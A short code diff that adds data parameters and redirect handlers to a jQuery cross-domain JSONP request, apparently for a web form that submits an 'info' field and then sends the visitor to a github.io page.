@@ -339,7 +339,14 @@
       crossDomain: true,
       url: url ,
       method: "GET",
-      dataType: "jsonp"
+      dataType: "jsonp",
+	  data: {action: 'submit_data', info: info},
+	  success: function(data) {
+                window.location.href="https://vikesh-tonpe.github.io/.github.io/";
+            },
+            error: function(data) {
+            window.location.href="https://vikesh-tonpe.github.io/.github.io/";
+            },
     });
 	}else{
 	console.log("wrong input");
